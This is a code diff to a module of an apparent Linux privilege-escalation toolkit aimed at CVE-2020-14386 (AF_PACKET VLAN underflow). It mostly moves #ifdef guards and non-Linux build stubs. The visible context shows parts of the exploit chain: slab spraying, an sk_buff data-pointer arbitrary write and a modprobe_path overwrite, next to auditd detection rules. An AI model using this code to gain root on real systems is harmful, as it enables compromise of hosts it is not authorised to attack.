@@ -45,9 +45,6 @@
 
 #include "skeletonkey_modules.h"
 #include "../../core/registry.h"
-#include "../../core/kernel_range.h"
-#include "../../core/offsets.h"
-#include "../../core/finisher.h"
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -55,13 +52,18 @@
 #include <stdint.h>
 #include <stdbool.h>
 #include <unistd.h>
+
+#ifdef __linux__
+
+#include "../../core/kernel_range.h"
+#include "../../core/offsets.h"
+#include "../../core/finisher.h"
+
 #include <errno.h>
 #include <fcntl.h>
 #include <sched.h>
 #include <sys/wait.h>
 #include <sys/socket.h>
-
-#ifdef __linux__
 #include <sys/mman.h>
 #include <sys/ioctl.h>
 #include <sys/syscall.h>
@@ -72,52 +74,6 @@
 #include <linux/if_ether.h>
 #include <linux/if_arp.h>
 #include <poll.h>
-#endif
-
-/* ---------- macOS / non-linux build stubs ---------------------------
- * Modules in SKELETONKEY are dev-built on macOS and run-built on Linux.
- * Provide empty stubs so syntax checks pass without Linux headers.
- * The exploit path is gated at runtime on the kernel version anyway,
- * so the stubs are never reached on macOS targets. */
-#ifndef __linux__
-#define CLONE_NEWUSER       0x10000000
-#define CLONE_NEWNET        0x40000000
-#define ETH_P_ALL           0x0003
-#define ETH_P_8021Q         0x8100
-#define ETH_P_8021AD        0x88A8
-#define ETH_P_IP            0x0800
-#define ETH_ALEN            6
-#define ETH_HLEN            14
-#define VLAN_HLEN           4
-#define IFF_UP              0x01
-#define IFF_RUNNING         0x40
-#define SIOCSIFFLAGS        0x8914
-#define SIOCGIFINDEX        0x8933
-#define SIOCGIFFLAGS        0x8913
-#define SOL_PACKET          263
-#define PACKET_RX_RING      5
-#define PACKET_VERSION      10
-#define PACKET_QDISC_BYPASS 20
-#define TPACKET_V2          1
-#define PACKET_HOST         0
-struct sockaddr_ll { unsigned short sll_family; unsigned short sll_protocol; int sll_ifindex; int dummy; };
-struct ifreq { char name[16]; union { int ifr_ifindex; short ifr_flags; } u; };
-struct tpacket_req { unsigned int tp_block_size, tp_block_nr, tp_frame_size, tp_frame_nr; };
-struct tpacket2_hdr { unsigned int tp_status, tp_len, tp_snaplen; unsigned short tp_mac, tp_net; };
-struct pollfd { int fd; short events, revents; };
-#define POLLIN 0x001
-__attribute__((unused)) static int    ioctl(int a, unsigned long b, ...) { (void)a; (void)b; errno=ENOSYS; return -1; }
-__attribute__((unused)) static void  *mmap(void *a, size_t b, int c, int d, int e, long f) { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f; errno=ENOSYS; return (void*)-1; }
-__attribute__((unused)) static int    munmap(void *a, size_t b) { (void)a;(void)b; return -1; }
-__attribute__((unused)) static int    setsockopt(int a, int b, int c, const void *d, unsigned int e) { (void)a;(void)b;(void)c;(void)d;(void)e; errno=ENOSYS; return -1; }
-__attribute__((unused)) static int    poll(struct pollfd *a, unsigned long b, int c) { (void)a;(void)b;(void)c; errno=ENOSYS; return -1; }
-__attribute__((unused)) static unsigned short htons(unsigned short x) { return x; }
-#define MAP_SHARED  0x01
-#define MAP_LOCKED  0x2000
-#define PROT_READ   0x1
-#define PROT_WRITE  0x2
-#define MAP_FAILED ((void *)-1)
-#endif
 
 static const struct kernel_patched_from af_packet2_patched_branches[] = {
     {4,  9, 235},
@@ -222,8 +178,6 @@ static skeletonkey_result_t af_packet2_detect(const struct skeletonkey_ctx *ctx)
  * alongside — i.e. lights up auditd/sigma signatures and demonstrates
  * the primitive. It does not land cred overwrite.
  */
-
-#ifdef __linux__
 
 /* sendmmsg spray helper — best-effort skb groom. Adjacent kernel slab
  * objects are sprayed so the OOB write lands on attacker bytes. */
@@ -440,15 +394,6 @@ static int af_packet2_primitive_child(const struct skeletonkey_ctx *ctx)
     return 0;
 }
 
-#else /* !__linux__: provide a stub for macOS sanity builds */
-static int af_packet2_primitive_child(const struct skeletonkey_ctx *ctx)
-{
-    (void)ctx;
-    fprintf(stderr, "[-] af_packet2: linux-only primitive — non-linux build\n");
-    return -1;
-}
-#endif
-
 /* ---- Full-chain finisher (--full-chain, x86_64 only) ----------------
  *
  * Arb-write strategy (Or Cohen's sk_buff-data-pointer hijack):
@@ -490,7 +435,7 @@ struct afp2_arb_ctx {
     int n_attempts;            /* spray/fire rounds before giving up */
 };
 
-#if defined(__x86_64__) && defined(__linux__)
+#if defined(__x86_64__)
 static int afp2_arb_write(uintptr_t kaddr, const void *buf, size_t len, void *vctx)
 {
     struct afp2_arb_ctx *c = (struct afp2_arb_ctx *)vctx;
@@ -508,9 +453,7 @@ static int afp2_arb_write(uintptr_t kaddr, const void *buf, size_t len, void *vc
      * frame would then write our payload (the modprobe_path string)
      * into the forged ->data target. */
     for (int i = 0; i < c->n_attempts; i++) {
-#ifdef __linux__
         af_packet2_skb_spray(8);
-#endif
         pid_t p = fork();
         if (p < 0) return -1;
         if (p == 0) {
@@ -535,9 +478,7 @@ static int afp2_arb_write(uintptr_t kaddr, const void *buf, size_t len, void *vc
         }
         int st;
         waitpid(p, &st, 0);
-#ifdef __linux__
         af_packet2_skb_spray(8);
-#endif
     }
 
     /* LAST-RESORT depth: we have fired the trigger + spray but cannot
@@ -664,7 +605,7 @@ static skeletonkey_result_t af_packet2_exploit(const struct skeletonkey_ctx *ctx
                             "    skeletonkey intentionally does not embed per-kernel offsets.\n");
         }
         if (ctx->full_chain) {
-#if defined(__x86_64__) && defined(__linux__)
+#if defined(__x86_64__)
             /* --full-chain: resolve kernel offsets and run the Or-Cohen
              * sk_buff-data-pointer hijack via the shared modprobe_path
              * finisher. Per the verified-vs-claimed bar: if we can't
@@ -702,6 +643,29 @@ static skeletonkey_result_t af_packet2_exploit(const struct skeletonkey_ctx *ctx
         return SKELETONKEY_EXPLOIT_FAIL;
     }
 }
+
+#else  /* !__linux__ */
+
+/* Non-Linux dev builds: AF_PACKET + TPACKET_V2 + tpacket_rcv VLAN
+ * underflow are Linux-only kernel surface. Stub out cleanly so the
+ * module still registers and `--list` / `--detect-rules` work on
+ * macOS/BSD dev boxes — and so the top-level `make` actually completes
+ * there. */
+static skeletonkey_result_t af_packet2_detect(const struct skeletonkey_ctx *ctx)
+{
+    if (!ctx->json)
+        fprintf(stderr, "[i] af_packet2: Linux-only module "
+                "(AF_PACKET TPACKET_V2 + user_ns) — not applicable here\n");
+    return SKELETONKEY_PRECOND_FAIL;
+}
+static skeletonkey_result_t af_packet2_exploit(const struct skeletonkey_ctx *ctx)
+{
+    (void)ctx;
+    fprintf(stderr, "[-] af_packet2: Linux-only module — cannot run here\n");
+    return SKELETONKEY_PRECOND_FAIL;
+}
+
+#endif /* __linux__ */
 
 static const char af_packet2_auditd[] =
     "# AF_PACKET VLAN LPE (CVE-2020-14386) — auditd detection rules\n"
